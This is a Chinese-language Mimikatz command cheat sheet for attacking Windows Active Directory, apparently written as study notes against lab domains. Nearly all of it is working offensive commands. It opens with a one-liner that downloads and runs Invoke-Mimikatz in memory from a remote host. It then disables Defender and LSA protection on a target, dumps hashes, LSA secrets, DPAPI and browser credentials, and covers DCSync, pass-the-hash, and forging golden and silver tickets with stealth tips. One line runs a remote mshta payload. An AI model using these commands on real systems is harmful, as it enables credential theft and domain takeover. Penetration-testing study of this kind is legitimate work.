# 引入Invoke-Mimikatz.ps1，并且在内存中执行
```
iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)
```

# 横向执行Mimikatz
从上面我们已经知道当前账号ciadmin可以横向登录到计算机dcorp-mgmt.dollarcorp.moneycorp.local，我们把登录的session保存在$sess
```$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local```

指定目标靶机的session，在目标靶机关闭杀软（效果跟bypass AMSI大同小异，不过因为我们是目标靶机上的管理员，因此可以直接关闭）
```Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess```

指定目标靶机的session，在目标靶机执行Mimikatz
```Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess```


# 导出所有ntml 哈希
```
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```

# 导出本地所有用户的NTML
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

# 导出特定用户的哈希
```
lsadump::dcsync /domain:kevin.com /user:root

lsadump::dcsync /user:za\krbtgt

lsadump::dcsync /DEV.ADMIN.OFFSHORE.COM:172.16.2.6 /all /csv

```

# 从sam.hive和system.hive文件中获得NTLM Hash
```
lsadump::sam /sam:sam.hive /system:system.hive
```

Invoke-Mimikatz -Command '"lsadump::sam /sam:sam.hive /system:system.hive"'

# 从本地SAM文件中读取密码哈希
```
token::elevate
lsadump::sam
```

# 生成某个用户命令的shell（需要NTML） Over the hash
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
```

# 执行命令
```
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

# Mimikatz.ps1调用自己（适用于有Applocker策略不允许执行ps1脚本的环境）
在Invoke-Mimikatz.ps1文件的最底部，加一行命令：Invoke-Mimikatz


# Mimikatz.exe
```
#提升权限
privilege::debug

# 本地sam文件
lsadump::sam

#抓取所有登录密码
sekurlsa::logonpasswords

# ekeys
sekurlsa::ekeys

# vault凭据
vault::cred /patch

# 转存lsa的secrets
lsadump::secrets

# 从DC中下载所有哈希
lsadump::lsa /patch
```

# 禁用LSA保护

如果启用了 LSA 保护，执行“sekurlsa::logonpasswords”命令会出错。

```
mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```

禁用 LSA 保护。我们可以通过执行“！+”将其导入到 Mimikatz

```
mimikatz # !+
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started
```

如果执行完上面程序仍然还不可以导出哈希，那么使用下面命令禁用 LSA 保护

```
mimikatz # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID 528 -> 00/00 [0-0-0]
```


此文档参考内容见[这里](https://tools.thehacker.recipes/mimikatz/modules)

# privilege
```
privilege::backup requests the backup privilege (SeBackupPrivilege)
privilege::debug requests the debug privilege (SeDebugPrivilege)
privilege::driver requests the load driver privilege (SeLoadDriverPrivilege)
privilege::id requests a privilege by its id
privilege::name requests a privilege by its name
privilege::restore requests the restore privilege (SeRestorePrivilege)
privilege::security requests the security privilege (SeSecurityPrivilege)
privilege::sysenv requests the system environment privilege (SeSystemEnvironmentPrivilege)
privilege::tcb requests the tcb privilege (SeTcbPrivilege)
```

# lsadump模块

## backupkeys
从域控制器转储DPAPI backup keys
```
mimikatz # lsadump::backupkeys /export
```

## cache
从注册表dump出缓存凭据
```
mimikatz # lsadump::cache
```

## changentlm
可用于更改用户的密码
```
mimikatz # lsadump::changentlm /server:DC.hacklab.local /user:adriane.lena /old:cded5acd2c1fc0f816c63ef317937deb /newpassword:WhatEverYouWant
```

## dcshadow
执行dcshadow攻击

修改组id
```
mimikatz # lsadump::dcshadow /object=optimus /attribute=primaryGroupID /value=512
```

执行修改
```
mimikatz # lsadump::dcshadow /push
```

## dcsync
请求域控同步从而dump出哈希

单个用户
```
mimikatz # lsadump::dcsync /domain:hacklab.local /user:hacklab\Administrator
```

所有用户
```
mimikatz # lsadump::dcsync /domain:hacklab.local /all
```

## netsync

请求目标计算机的rc4秘钥，需要dc主机的哈希
```
mimikatz # lsadump::netsync /dc:dc.hacklab.local /user:dc$ /ntlm:5b7ba7b6131a4aab1bbd60ba1a810e53 /account:win7$
```

## lsa

从内存中提取哈希值

```
mimikatz # lsadump::lsa /inject /name:krbtgt
```

> /inject : when run on a workstation, it will dump the LM and NT password hashes. When run on domain controller is will dump LM, NT, Wdigest, Kerberos keys and password history.


## packages
列出可用的windows身份验证机制

```
mimikatz # lsadump::packages
```

## postzerologon

> lsadump::postzerologon is a procedure to update AD domain password and its local stored password remotely mimic netdom resetpwd. Experimental and best situation after reboot

```
mimikatz # lsadump::postzerologon /target:192.168.0.10 /account:dc$
```

## rpdata

检索私人数据

```
mimikatz # lsadump::RpData
```

## sam

转储本地安全账户管理器（SAM）NT的哈希值

```
mimikatz # lsadump::sam
```

**离线转存**

cmd下
```
reg save HKLM\SYSTEM system.hive
reg save HKLM\SAM sam.hive
```

执行离线转存
```
mimikatz # lsadump::sam /system:system.hive /sam:sam.hive
```

## secrets
可以用来从注册表中转储LSA的secrets。它检索SysKey来解密Secrets条目
```
mimikatz # lsadump::secrets
```

**离线转存**

cmd下
```
reg save HKLM\SYSTEM system.hive
reg save HKLM\security security.hive
```

执行离线转存
```
mimikatz # lsadump::secrets /system:system.hive /sam:security.hive
```

## setntlm
可以用来在不知道用户当前密码的情况下执行密码重置。在活动目录访问控制（ACL）滥用情况下，它可能很有用
```
mimikatz # lsadump::setntlm /user:optimus /password:VeryStrongPass1! /server:dc.hacklab.local
```

## trust

dump出域和林的信任秘钥
```
mimikatz # lsadump::trust /patch
```

## zerologon
检测并利用ZeroLogon漏洞
```
mimikatz # lsadump::zerologon /target:dc.hacklab.local /account:dc$
```

# sekurlsa模块
这个模块可能是Mimikatz用户中使用最多的模块。它从LSA的子系统服务(LSASS)中检索明文密码、kerberos票、pin码等

## backupkeys

列出备份秘钥
```
mimikatz # sekurlsa::backupkeys
```

## bootkey
设置SecureKernel Boot Key并尝试解密LSA Isolated凭证
```
mimikatz # sekurlsa::bootkey
```

## cloudap
列出 Azure (Primary Refresh Token) 凭据

```
mimikatz # sekurlsa::cloudap
```

## credman
通过针对微软本地安全授权服务器DLL（lsasrv.dll）列出凭证管理器。

```
mimikatz # sekurlsa::credman
```

## dpapi
列出DPAPI缓存的masterkeys

```
mimikatz # sekurlsa::dpapi
```

## dpapisystem

列出DPAPI_SYSTEM secret key

```
mimikatz # sekurlsa::dpapisystem
```

## ekeys

列出Kerberos加密密钥
```
mimikatz # sekurlsa::ekeys
```

## kerberos

列出Kerberos凭证
```
mimikatz # sekurlsa::kerberos
```

## krbtgt
检索krbtgt RC4（即NT哈希值）、AES128和AES256哈希值

```
mimikatz # sekurlsa::krbtgt
```

## livessp
列出了LiveSSP凭证。据微软称，LiveSSP供应商默认包含在Windows 8和更高版本中，并包含在Office 365登录助手中

```
mimikatz # sekurlsa::livessp
```

## logonpasswords
列出所有可用的提供者凭证。这通常显示最近登录的用户和计算机凭证

```
mimikatz # sekurlsa::logonpasswords
```

## minidump

可以针对转储的LSASS进程文件使用，它不需要管理权限。它被认为是一种 "离线 "转储。
```
mimikatz # sekurlsa::minidump file.dmp

mimikatz # sekurlsa::logonpasswords
```

## msv

通过针对MSV1_0 Authentication Package，转储和列出NT哈希值（和其他secrets）
```
mimikatz # sekurlsa::msv
```

## process

通过切换到LSASS进程的上下文，之后就可以使用sekurlsa::minidump命令

```
mimikatz # sekurlsa::minidump lsass.dump.dmp

mimikatz # sekurlsa::process
```

## pth

执行Pass-the-Hash、Pass-the-Key和Over-Pass-the-Hash。认证成功后，将运行一个程序（注：默认为cme.exe）

```
mimikatz # sekurlsa::pth /user:Administrator /domain:hacklab.local /ntlm:b09a14d2d325026f8986d4a874fbcbc7
```

**令牌模拟**
当前账号是普通域用户，知道Administrator的哈希

模拟Administrator的令牌，使用```/impersonate```参数
```
mimikatz # sekurlsa::pth /user:Administrator /domain:hacklab.local /ntlm:b09a14d2d325026f8986d4a874fbcbc7 /impersonate
```

现在在Administrator的上下文中可以执行dcsync
```
mimikatz # lsadump::dcsync /user:Administrator
```

## ssp

列出Security Support Provider (SSP)凭据

```
mimikatz # sekurlsa::ssp
```

## tickets
列出属于目标服务器/工作站上所有认证用户的Kerberos ticket。与kerberos::list不同，sekurlsa使用内存读取，不受密钥输出的限制。Sekurlsa也可以访问其他会话（用户）的票据。

```
mimikatz # sekurlsa::tickets
```

## trust

检索林信任keys
```
mimikatz # sekurlsa::trust
```

## tspkg

列出 TsPkg凭据，这个凭证提供者用于终端服务器认证
```
mimikatz # sekurlsa::tspkg
```

## wdigest
列出了WDigest凭证。据微软称，WDigest.dll是在Windows XP操作系统中引入的。Digest认证协议旨在与超文本传输协议（HTTP）和简单认证安全层（SASL）交换使用
```
mimikatz # sekurlsa::wdigest
```


# Vault模块

Mimikatz的这个模块与Windows Credentials Vault进行交互。DPAPI是获得相同结果的一个更好的替代选项

## cred

枚举vault 里面的凭据

```
mimikatz # vault::cred

mimikatz # vault::cred /patch
```

## list

列出Windows Vault中保存的凭证，如计划任务、RDP、当前用户的Internet Explorer等

```
mimikatz # vault::list
```

# dpapi

## blob
> describes a DPAPI blob and unprotects/decrypts it with API or Masterkey

```
mimikatz # dpapi::blob /in:dpapi_blob.txt /unprotect
```

## cache
显示DPAPI模块的凭证缓存

```
mimikatz # dpapi::cache
```

## capi
解密一个CryptoAPI的私钥文件

```
mimikatz # dpapi::capi /in:"D:\\Users\\Gentil Kiwi\\AppData\\Roaming\\Microsoft\\Crypto\\RSA\\S-1-5-21-494464150-3436831043-1864828003-1001\\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b" /masterkey:f2c9ea33a990c865e985c496fb8915445895d80b
```

## chrome
从Chrome中转储的证书和cookies
```
mimikatz # dpapi::chrome /in:"C:\Users\m3g9tr0n\AppData\Local\Google\Chrome\User Data\Default\Login Data" /masterkey:3f7a17dd6658319fcd4b832afc20ac7dacbb9d7cd668527c71f98e90464624634c614a7923a3beb23c4e24dd718f2a8e838ce72935fb29f11507affb543a53c3
```

## cng

> decrypts a given CNG private key file. According to this document, the Crypto Next Generation (CNG) API is a successor of of Crypto API (CAPI).

```
mimikatz # dpapi::cng /in:"C:\Users\m3g9tr0n\AppData\Roaming\Microsoft\Crypto\Keys\de7cf8a7901d2ad13e5c67c29e5d1662_e4aad2d1-5ec0-4ea4-b259-65eda5bc47a8" /unprotect
```


## create

从原始密钥和元数据创建一个DPAPI主密钥文件。当你想在你的机器上解密一个受害者的DPAPI机密时，它就会派上用场。
```
mimikatz # dpapi::create /guid:{5c22983f-77ee-41e4-9086-8073d664e417} /key:3f7a17dd6658319fcd4b832afc20ac7dacbb9d7cd668527c71f98e90464624634c614a7923a3beb23c4e24dd718f2a8e838ce72935fb29f11507affb543a53c3 /password:Super_SecretPass /protected
```

## cred
解密DPAPI保存的凭证，如RDP、计划任务等。
```
mimikatz # dpapi::cred /in:%systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\AA10EB8126AA20883E9542812A0F904C
```

## credhist
描述了一个Credhist文件。Passcape提到，CREDHIST是一个密码历史文件，做为一个链条，其中每个链接代表用户的旧密码哈希值（NT和SHA1）。每次用户改变密码时，旧的密码哈希值被附加到文件中，并以新的密码进行加密。

```
mimikatz# dpapi::credhist in:"C:\users<UserName>\appdata\Roaming\Microsoft\Protect\CREDHIST"
```

## masterkey

描述了一个Masterkey file，并解开了每个Masterkey 的保护（取决于密钥）。换句话说，它可以从活动目录中解密和请求Masterkey 

```
mimikatz # dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-1719172562-3308538836-3929312420-1104\cc6eb538-28f1-4ab4-adf2-f5594e88f0b2"
```

## protect

通过DPAPI调用保护数据
```
mimikatz # dpapi::protect /data:"Hello Mimikatz"

mimikatz # dpapi::protect /data:"Hello Mimikatz" /c

mimikatz # dpapi::protect /data:"Hello Mimikatz" /out:dpapi_blob.txt  #输出到文件dpapi_blob.txt
```

## ps
解密PowerShell凭证（PSCredentials或SecureString）。

```
mimikatz # dpapi::ps /in:ps_cred.xml /unprotect
```

## rdg

解密远程桌面网关保存的密码
```
mimikatz # dpapi::rdg /in:test.rdg /unprotect
```

## sccm

用来解密保存的SCCM凭证

```
mimikatz # dpapi::sccm  /unprotect
```


## ssh

提取OpenSSH私钥

```
mimikatz # dpapi::ssh /unprotect
```

## vault

从凭证库中解密DPAPI金库凭证

```
mimikatz # dpapi::vault /cred:"C:\Users\m3g9tr0n\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28\21CD6FA9B5E4C7D1D04AE0182DD7F440F54E02ED.vcrd" /policy:"C:\Users\m3g9tr0n\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28\Policy.vpol" /masterkey:3f7a17dd6658319fcd4b832afc20ac7dacbb9d7cd668527c71f98e90464624634c614a7923a3beb23c4e24dd718f2a8e838ce72935fb29f11507affb543a53c3
```

## wifi

解密保存的Wi-Fi密码

```
mimikatz # dpapi::wifi /in:"C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\{F4257B8E-3599-4A6F-AEA2-B3B7646ECA80}\{25F4C906-099A-4871-826D-8A604C132954}.xml" /unprotect
```

## wwan

解密Wwan的证书

```
mimikatz# dpapi::wwan /in:"C:\ProgramData\Microsoft\Wlansvc\Profiles{interface guid}\*.xml" /unprotect
```



# kerberos

## ask

可用于获取服务票证
```
mimikatz # kerberos::ask 0-40e10000-m3g9tr0n@krbtgt~HACKLAB.LOCAL-HACKLAB.LOCAL.kirbi /target:CIFS/dc.hacklab.local

mimikatz # kerberos::ask /rc4 0-40e10000-m3g9tr0n@krbtgt~HACKLAB.LOCAL-HACKLAB.LOCAL.kirbi /target:HTTP/dc.hacklab.local
```

## clist

 以MIT/Heimdall ccache格式列出门票
```
mimikatz # kerberos::clist
```

## golden

可以用来伪造金票和银票。它也可用于伪造域间信任密钥。

金票
```
mimikatz # kerberos::golden /domain:hacklab.local /sid:S-1-5-21-2725560159-1428537199-2260736313 /rc4:b5348d0a20a24a67ff544146a09cd292 /user:krbtgt /ticket:ticket.kirbi /groups:500,501,513,512,520,518,519
```

银票
```
mimikatz # kerberos::golden /domain:hacklab.local /sid:S-1-5-21-2725560159-1428537199-2260736313 /rc4:647dac3559c899c5fe4dad7723feb8c5 /user:m3g9tr0n /service:CIFS/dc.hacklab.local /target:dc.hacklab.local
```


**Golden ticket & SIDHistory spoofing**
当森林信任关系是双向的，有可能通过做SIDHistory欺骗，从一个子域升级到父根域。

```
mimikatz #kerberos::golden /domain:<domain_name> /sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name> /ticket:ticket.kirbi /sids:<sid_of_parent_domain>
```


**Inter-Realm Trust Tickets**
要获得森林信任密钥，必须使用 lsadump::trust /patch 命令。根据森林信任关系，使用信任密钥而不是 krbtgt 帐户可能更隐蔽，因为大多数防御机制都在监视 krbtgt 帐户

```
mimikatz # kerberos::golden /user:<user_name> /domain:<domain_name> /sid:<domain_sid> /sids:<sid_of_target_domain> /rc4:<trust_key_RC4_key> /service:krbtgt /target:<the_target_domain> /ticket:<file_to_save>
```

## hash

根据给定的明文密码计算出不同的kerberos哈希（NTLM,AES128,AES256）

```
mimikatz # kerberos::hash /user:m3g9tr0n /domain:hacklab.local /password:Super_SecretPass1!
```

## list

具有类似于klist命令的功能，而不需要提升权限。与sekurlsa::tickets不同，该模块不与LSASS交互。

```
mimikatz # kerberos::list
```

## ptc

可以用来传递缓存。这类似于kerberos::ptt，它确实传递了票据，但不同的是，使用的票据是.ccache票据而不是.kirbi票据。
```
mimikatz # kerberos::ptc m3g9tr0n@HACKLAB.LOCAL_krbtgt~HACKLAB.LOCAL@HACKLAB.LOCAL.ccache
```

## ptt

用于通过在当前会话中注入一个或多个 Kerberos 票据来传递票据。票据可以是TGT（Ticket-Granting Ticket），也可以是ST（Service Ticket）。

```
mimikatz # kerberos::ptt 0-40e10000-m3g9tr0n@krbtgt~HACKLAB.LOCAL-HACKLAB.LOCAL.kirbi
```

## purge

清除票据，等价于```klist purge```命令
```
mimikatz # kerberos::purge
```

## tgt

检索当前用户的TGT（Ticket-Granting Ticket）。

```
mimikatz # kerberos::tgt
```

# process

## exports

> lists all the exported functions from the DLLs each running process is using. If a```/pid ```is not specified, then exports for mimikatz.exe will be displayed.

```
mimikatz # process::exports

mimikatz # process::exports /pid:3516
```

## imports

> lists all the imported functions from the DLLs each running process is using. If a```/pid``` is not specified, then imports for mimikatz.exe will be displayed. 

```
mimikatz # process::imports
```

## list

列出所有运行的进程
```
mimikatz # process::list
```

## resume
 通过使用NtResumeProcess Windows Native API函数恢复一个暂停的进程。
```
mimikatz # process::resume notepad /pid:9212
```

## run

通过使用CreateProcessAsUser Win32 API函数创建一个进程。CreateEnvironmentBlock也被利用了

```
mimikatz # process::run notepad
```

## runp
在一个父进程下运行一个子进程（默认的父进程是LSASS.exe）。它也可用于横向移动和进程欺骗。
```
mimikatz # process::runp /run:notepad.exe

mimikatz # process::runp /run:notepad.exe /ppid:6388   #指定进程

mimikatz # process::runp /run:"mshta http://192.168.0.220:80/delivery.hta" /ppid:2948   # mshta攻击负载执行

mimikatz # process::runp /run:"mshta http://192.168.0.220:80/delivery.hta" /ppid:2948 /token:1  # 在指定令牌下执行mshta有效负载
```

## start

通过使用CreateProcess Win32 API函数启动一个进程。该进程的PID也被显示出来
```
mimikatz # process::start notepad.exe
```

## stop
 通过使用NtTerminateProcess Windows Native API函数终止一个进程。
```
mimikatz # process::stop notepad /pid:6500
```

## suspend
通过使用NtSuspendProcess Windows Native API函数暂停一个进程。
```
mimikatz # process::suspend notepad /pid:9212
```


# token

## elevate
可以用来冒充一个令牌。默认情况下，它将把权限提升到NT AUTHORITY/SYSTEM

```
mimikatz # token::elevate
```

## list

枚举系统上所有的token
```
mimikatz # token::list
```

## revert
恢复到之前的令牌

```
mimikatz # token::revert
```

## run
执行一个带有其令牌的进程

```
mimikatz # token::run /process:explore.exe
```

## whoami

显示当前token

```
mimikatz # token::whoami
```